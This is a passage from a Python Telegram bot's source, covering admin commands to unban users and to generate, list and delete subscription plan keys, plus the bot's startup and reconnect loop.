        if len(parts) != 2:
            return await styled_reply(event, f"{PE} Format: /unban user_id", emoji_ids=[CE["warn"]])

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await styled_reply(event, f"{PE} User {user_id} is not banned!", emoji_ids=[CE["cross"]])

        success = await unban_user(user_id)

        if success:
            await styled_reply(event, f"{PE} User {user_id} has been unbanned!", emoji_ids=[CE["check"]])
            try:
                await styled_send(user_id, f"{PE} You Have Been Unbanned!\n\nYou can now use this bot again in groups.\n\nFor private access, you will need to purchase a new key.", emoji_ids=[CE["crown"]])
            except Exception:
                pass
        else:
            await styled_reply(event, f"{PE} Failed to unban user {user_id}", emoji_ids=[CE["cross"]])

    except ValueError:
        await styled_reply(event, f"{PE} Invalid user ID!", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

# ====================== ADD NEW PLAN KEY COMMANDS HERE ======================

@client.on(events.NewMessage(pattern='/genkey'))
async def generate_plan_keys(event):
    """Admin command to generate plan keys"""
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])
    
    try:
        parts = event.raw_text.split()
        
        if len(parts) != 4:
            return await styled_reply(
                event, 
                f"{PE} <b>Usage:</b>\n"
                f"<code>/genkey &lt;plan&gt; &lt;amount&gt; &lt;days&gt;</code>\n\n"
                f"<b>Plans:</b> free, pro, toji\n"
                f"<b>Example:</b> <code>/genkey pro 5 30</code>\n"
                f"<b>Max amount:</b> 20 keys at once",
                emoji_ids=[CE["warn"]]
            )
        
        plan_type = parts[1].lower()
        amount = int(parts[2])
        days = int(parts[3])
        
        if plan_type not in ["free", "pro", "toji"]:
            return await styled_reply(
                event, 
                f"{PE} Invalid plan! Use: free, pro, or toji",
                emoji_ids=[CE["cross"]]
            )
        
        if amount > 20:
            return await styled_reply(
                event, 
                f"{PE} Max 20 keys at once!",
                emoji_ids=[CE["cross"]]
            )
        
        if days < 1 or days > 365:
            return await styled_reply(
                event, 
                f"{PE} Days must be between 1 and 365!",
                emoji_ids=[CE["cross"]]
            )
        
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            await create_plan_key(key, plan_type, days)
            generated_keys.append(key)
        
        plan_emoji = {
            "free": "🆓",
            "pro": "💎",
            "toji": "👑"
        }.get(plan_type, "⭐")
        
        keys_text = "\n".join([f"{PE} <code>{key}</code> ━ {plan_emoji} {plan_type.upper()} ━ {days} days" for key in generated_keys])
        
        response = f"""{PE} <b>Plan Keys Generated</b>
━━━━━━━━━━━━━━━━━
Plan: {plan_type.upper()}
Amount: {amount}
Duration: {days} days
━━━━━━━━━━━━━━━━━

{keys_text}

━━━━━━━━━━━━━━━━━
{PE} Users can redeem with: <code>/redeem KEY</code>"""

        await styled_reply(event, response, emoji_ids=[CE["gift"], CE["crown"], CE["star"]])
        
    except ValueError:
        await styled_reply(
            event, 
            f"{PE} Invalid number! Use: <code>/genkey pro 5 30</code>",
            emoji_ids=[CE["cross"]]
        )
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/keys'))
async def list_plan_keys(event):
    """Admin command to list all generated plan keys"""
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])
    
    try:
        rows = await get_all_plan_keys(50)
        
        if not rows:
            return await styled_reply(
                event, 
                f"{PE} No keys generated yet!\nUse <code>/genkey</code> to create keys.",
                emoji_ids=[CE["warn"]]
            )
        
        keys_list = []
        for row in rows:
            key, plan_type, days, used, used_by, created_at = row
            status = "✅ USED" if used else "🆓 UNUSED"
            used_info = f" ━ by {used_by}" if used_by else ""
            keys_list.append(
                f"{PE} <code>{key}</code> ━ {plan_type.upper()} ━ {days}d ━ {status}{used_info}"
            )
        
        total_keys = len(rows)
        response = f"""{PE} <b>Generated Keys (Last {total_keys})</b>
━━━━━━━━━━━━━━━━━

{chr(10).join(keys_list)}

━━━━━━━━━━━━━━━━━
{PE} Total: {total_keys} keys shown
{PE} Use <code>/genkey</code> to create more
{PE} Use <code>/delkey &lt;key&gt;</code> to delete a key"""
        
        await styled_reply(event, response, emoji_ids=[CE["gift"], CE["star"]])
        
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern='/delkey'))
async def delete_plan_key_cmd(event):
    """Admin command to delete a plan key"""
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} <b>Admin only</b>", emoji_ids=[CE["stop"]])
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await styled_reply(
                event,
                f"{PE} Usage: <code>/delkey KEY</code>\n\nExample: <code>/delkey ABC123XYZ789</code>",
                emoji_ids=[CE["warn"]]
            )
        
        key = parts[1].upper()
        success = await delete_plan_key(key)
        
        if success:
            await styled_reply(
                event,
                f"{PE} Key <code>{key}</code> has been deleted!",
                emoji_ids=[CE["check"]]
            )
        else:
            await styled_reply(
                event,
                f"{PE} Key <code>{key}</code> not found or could not be deleted!",
                emoji_ids=[CE["cross"]]
            )
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

# ====================== END OF PLAN KEY COMMANDS ======================

async def main():
    global client_instance
    client_instance = client

    print("🗄️ Initializing database...")
    await init_db()   # 🔥 THIS WAS MISSING
    while True:
        try:
            print("🚀 Starting bot...")

            # Start bot safely
            await client.start(bot_token=BOT_TOKEN)

            print("✅ Bot started successfully!")

            # Keep running
            await client.run_until_disconnected()

        except FloodWaitError as e:
            print(f"⚠️ FloodWait detected: sleeping for {e.seconds} seconds...")
            wait_time = e.seconds + 5
            print(f"Sleeping safely for {wait_time} seconds...")
            await asyncio.sleep(wait_time)

        except Exception as e:
            print(f"❌ Unexpected error: {e}")
            print("🔄 Restarting in 10 seconds...")
            await asyncio.sleep(10)



if __name__ == "__main__":
    asyncio.run(main())
